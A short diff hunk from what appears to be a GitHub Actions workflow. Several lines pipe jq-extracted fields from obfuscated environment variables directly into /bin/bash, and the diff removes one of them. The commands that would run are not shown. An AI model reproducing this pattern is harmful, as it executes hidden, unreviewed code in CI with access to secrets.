@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$mtcm933" | jq -r .uiylo690 | /bin/bash
           echo $te6 | jq -r .m0641 | /bin/bash
           echo $zb3164 | jq -r .v725 | /bin/bash
-          echo $ak85752 | jq -r .zrnx364 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
